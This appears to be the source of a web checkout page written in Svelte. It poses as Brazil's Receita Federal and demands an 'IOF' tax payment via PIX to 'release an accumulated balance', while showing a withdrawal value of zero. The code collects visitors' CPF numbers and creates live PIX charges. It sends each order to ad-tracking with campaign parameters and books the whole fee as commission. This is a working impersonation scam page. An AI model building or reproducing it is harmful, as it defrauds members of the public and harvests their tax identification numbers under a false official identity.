<script lang="ts">
  import Input from '$lib/components/Input.svelte';
  import Checkbox from '$lib/components/Checkbox.svelte';
  import { supabase } from '$lib/supabase';
  import { utmfy } from '$lib/utmfy';
  import QRCode from 'qrcode';

  let cpf = $state('');
  let agreed = $state(false);
  let isLoading = $state(false);
  let qrCodeUrl = $state<string | null>(null);
  let pixCode = $state<string | null>(null);
  let transactionId = $state<string | null>(null);
  let iofValue = $state(32.93);
  let errorMessage = $state<string | null>(null);

  function formatCPF(value: string): string {
    const numbers = value.replace(/\D/g, '');
    return numbers
      .replace(/(\d{3})(\d)/, '$1.$2')
      .replace(/(\d{3})(\d)/, '$1.$2')
      .replace(/(\d{3})(\d{1,2})/, '$1-$2')
      .slice(0, 14);
  }

  function handleCPFChange(value: string) {
    cpf = formatCPF(value);
  }

  async function handlePayment() {
    if (!cpf || !agreed) return;

    isLoading = true;
    errorMessage = null;

    try {
      console.log('[Checkout] Creating PIX payment...');

      const apiUrl = `${import.meta.env.VITE_SUPABASE_URL}/functions/v1/create-pix-payment`;
      const headers = {
        'Authorization': `Bearer ${import.meta.env.VITE_SUPABASE_ANON_KEY}`,
        'Content-Type': 'application/json',
      };

      const requestBody = {
        amount: Math.round(iofValue * 100),
        customerCpf: cpf.replace(/\D/g, ''),
        customerName: 'Cliente',
        customerEmail: 'cliente@email.com',
        customerPhone: '11999999999',
      };

      console.log('[Checkout] Calling Edge Function:', apiUrl);
      console.log('[Checkout] Request body:', requestBody);

      const response = await fetch(apiUrl, {
        method: 'POST',
        headers,
        body: JSON.stringify(requestBody),
      });

      console.log('[Checkout] Response status:', response.status);

      const data = await response.json();
      console.log('[Checkout] Response data:', data);

      if (!response.ok) {
        console.error('[Checkout] Error response:', data);

        if (data.error === 'Payment gateway not configured') {
          errorMessage = 'Gateway de pagamento não configurado. Entre em contato com o suporte.';
        } else if (data.error === 'Erro ao conectar com gateway de pagamento') {
          errorMessage = 'Não foi possível conectar com o gateway de pagamento. Verifique as credenciais.';
        } else {
          errorMessage = data.details || data.error || 'Erro ao processar pagamento.';
        }

        isLoading = false;
        return;
      }

      if (data?.pix) {
        console.log('[Checkout] PIX generated successfully');
        pixCode = data.pix.qrcode;
        transactionId = data.id;

        qrCodeUrl = await QRCode.toDataURL(data.pix.qrcode, {
          width: 256,
          margin: 2,
        });

        const utmParams = utmfy.getParams();
        const now = new Date();
        const createdAt = now.toISOString().replace('T', ' ').slice(0, 19);

        const utmfyPayload = {
          orderId: data.id,
          platform: 'PixGateway',
          paymentMethod: 'pix' as const,
          status: 'waiting_payment' as const,
          createdAt: createdAt,
          approvedDate: null,
          refundedAt: null,
          customer: {
            name: 'Cliente',
            email: 'cliente@email.com',
            phone: '11999999999',
            document: cpf.replace(/\D/g, ''),
            country: 'BR',
            ip: undefined,
          },
          products: [
            {
              id: 'iof-payment',
              name: 'IOF - Imposto sobre Operações Financeiras',
              planId: null,
              planName: null,
              quantity: 1,
              priceInCents: Math.round(iofValue * 100),
            },
          ],
          trackingParameters: {
            src: utmfy.getClickId(),
            sck: null,
            utm_source: utmParams.utm_source || null,
            utm_campaign: utmParams.utm_campaign || null,
            utm_medium: utmParams.utm_medium || null,
            utm_content: utmParams.utm_content || null,
            utm_term: utmParams.utm_term || null,
          },
          commission: {
            totalPriceInCents: Math.round(iofValue * 100),
            gatewayFeeInCents: 0,
            userCommissionInCents: Math.round(iofValue * 100),
          },
          isTest: false,
        };

        await utmfy.sendOrder(utmfyPayload).catch(err => console.error('[Checkout] UTMfy sendOrder error:', err));
        await utmfy.trackConversion({
          transaction_id: data.id,
          amount: iofValue,
          currency: 'BRL',
          payment_method: 'pix',
        }).catch(err => console.error('[Checkout] UTMfy trackConversion error:', err));

        console.log('[Checkout] QR Code generated, showing payment screen');
      } else {
        console.error('[Checkout] Invalid response - no pix data:', data);
        errorMessage = 'Resposta inválida do servidor. Tente novamente.';
        isLoading = false;
      }
    } catch (error: any) {
      console.error('[Checkout] Payment error:', error);
      errorMessage = error?.message || 'Erro ao processar pagamento. Tente novamente em alguns instantes.';
    } finally {
      isLoading = false;
    }
  }

  async function copyPixCode() {
    if (pixCode) {
      try {
        await navigator.clipboard.writeText(pixCode);
        alert('Código copiado!');
      } catch (err) {
        console.error('Failed to copy:', err);
      }
    }
  }
</script>

{#if qrCodeUrl && pixCode}
  <div class="min-h-screen bg-gradient-to-b from-blue-900 to-blue-950 flex flex-col">
    <header class="bg-blue-900 py-4 flex items-center justify-center gap-3">
      <svg class="w-8 h-8 text-yellow-400" viewBox="0 0 24 24" fill="currentColor">
        <path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5" />
      </svg>
      <span class="text-white font-semibold text-lg">Receita Federal</span>
    </header>

    <main class="flex-1 flex flex-col items-center px-4 py-6">
      <div class="bg-white rounded-lg w-full max-w-md p-6 shadow-lg">
        <h2 class="text-xl font-bold text-gray-900 text-center mb-4">
          Pague via PIX
        </h2>

        <div class="flex justify-center mb-4 bg-white p-4 rounded-lg">
          <img src={qrCodeUrl} alt="QR Code PIX" class="w-48 h-48" />
        </div>

        <p class="text-center text-gray-600 text-sm mb-4">
          Escaneie o QR Code ou copie o código abaixo
        </p>

        <div class="bg-gray-100 p-3 rounded-lg mb-4">
          <p class="text-xs text-gray-600 break-all font-mono">
            {pixCode.slice(0, 50)}...
          </p>
        </div>

        <button
          onclick={copyPixCode}
          class="w-full bg-teal-500 text-white py-3 rounded-lg font-semibold hover:bg-teal-600 transition-colors mb-4"
        >
          Copiar código PIX
        </button>

        <div class="text-center">
          <p class="text-gray-500 text-sm">
            Valor: <span class="font-semibold text-gray-900">R$ {iofValue.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}</span>
          </p>
          <p class="text-gray-400 text-xs mt-2">
            O pagamento será confirmado automaticamente
          </p>
        </div>
      </div>
    </main>
  </div>
{:else}
  <div class="min-h-screen bg-gradient-to-b from-blue-900 to-blue-950 flex flex-col">
    <header class="bg-blue-900 py-4 flex items-center justify-center gap-3">
      <svg class="w-8 h-8 text-yellow-400" viewBox="0 0 24 24" fill="currentColor">
        <path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5" />
      </svg>
      <span class="text-white font-semibold text-lg">Receita Federal</span>
    </header>

    {#if errorMessage && (errorMessage.includes('credenciais') || errorMessage.includes('gateway'))}
      <div class="mx-4 mt-4">
        <div class="bg-yellow-50 border border-yellow-300 p-3 rounded-lg">
          <div class="flex items-start gap-2">
            <svg class="w-5 h-5 text-yellow-600 flex-shrink-0 mt-0.5" fill="currentColor" viewBox="0 0 20 20">
              <path fill-rule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clip-rule="evenodd" />
            </svg>
            <div class="flex-1">
              <p class="text-sm font-semibold text-yellow-800">Modo de Desenvolvimento</p>
              <p class="text-xs text-yellow-700 mt-1">Gateway de pagamento não configurado. Configure as credenciais do Payzor para processar pagamentos reais.</p>
            </div>
          </div>
        </div>
      </div>
    {/if}

    <div class="mx-4 mt-4">
      <div class="bg-orange-100 border-l-4 border-orange-500 p-4 rounded-r-lg flex items-center gap-3">
        <svg class="w-6 h-6 text-orange-500 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
          <path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clip-rule="evenodd" />
        </svg>
        <span class="text-orange-800 font-medium">Imposto sobre Operações Financeiras (IOF)</span>
      </div>
    </div>

    <main class="flex-1 flex flex-col items-center px-4 py-6">
      <div class="bg-white rounded-lg w-full max-w-lg shadow-lg">
        <div class="p-6 border-b">
          <h2 class="text-xl font-bold text-gray-900">
            Pagamento do IOF Obrigatório para Liberação do Saldo Acumulado
          </h2>
        </div>

        <div class="p-4 mx-4 mt-4 bg-gray-50 rounded-lg">
          <h3 class="font-semibold text-gray-900 mb-4">Resumo</h3>
          <div class="space-y-3">
            <div class="flex justify-between">
              <span class="text-gray-600">Valor de saque</span>
              <span class="font-medium">R$ 0,00</span>
            </div>
            <div class="flex justify-between">
              <span class="text-red-600">Valor a ser pago (IOF)</span>
              <span class="text-red-600 font-medium">- R$ {iofValue.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}</span>
            </div>
            <div class="border-t pt-3 flex justify-between">
              <span class="font-semibold text-gray-900">Total a receber no PIX</span>
              <span class="font-bold text-gray-900">R$ {iofValue.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}</span>
            </div>
          </div>
        </div>

        <div class="p-4 mx-4 mt-4 bg-white border border-gray-200 rounded-lg">
          <label class="block text-sm font-medium text-gray-900 mb-2">
            CPF do titular <span class="text-red-500">*</span>
          </label>
          <Input
            placeholder="000.000.000-00"
            bind:value={cpf}
            oninput={handleCPFChange}
            class="w-full"
          />
          <p class="text-xs text-red-500 mt-1">* Campo obrigatório para prosseguir</p>
        </div>

        {#if errorMessage}
          <div class="p-4 mx-4 mt-4 bg-red-50 border border-red-200 rounded-lg">
            <p class="text-sm text-red-800 font-semibold mb-2">{errorMessage}</p>
            {#if errorMessage.includes('credenciais') || errorMessage.includes('gateway')}
              <div class="mt-3 pt-3 border-t border-red-200">
                <p class="text-xs text-red-700 font-semibold mb-1">Para configurar o gateway de pagamento:</p>
                <ol class="text-xs text-red-700 space-y-1 ml-4 list-decimal">
                  <li>Acesse o dashboard do Supabase</li>
                  <li>Vá em "Edge Functions" → "Secrets"</li>
                  <li>Adicione as variáveis:
                    <ul class="ml-4 mt-1 list-disc">
                      <li><code class="bg-red-100 px-1 rounded">PAYZOR_SECRET_KEY</code></li>
                      <li><code class="bg-red-100 px-1 rounded">PAYZOR_PUBLIC_KEY</code></li>
                    </ul>
                  </li>
                  <li>Obtenha as credenciais no painel do Payzor</li>
                </ol>
              </div>
            {/if}
          </div>
        {/if}

        <div class="p-4 mx-4">
          <button
            onclick={handlePayment}
            disabled={!cpf || !agreed || isLoading}
            class={`w-full py-4 rounded-lg font-semibold transition-all bg-blue-600 text-white ${
              cpf && agreed && !isLoading
                ? 'hover:bg-blue-700 opacity-100'
                : 'opacity-50 cursor-not-allowed'
            }`}
          >
            {isLoading ? 'Processando...' : 'Pagar Imposto (IOF)'}
          </button>
        </div>

        <div class="p-4 mx-4 mb-4 flex items-center gap-3">
          <Checkbox
            id="terms"
            bind:checked={agreed}
          />
          <label for="terms" class="text-sm text-gray-600 cursor-pointer">
            Concordo com os termos e condições <span class="text-red-500">*</span>
          </label>
        </div>
      </div>
    </main>
  </div>
{/if}
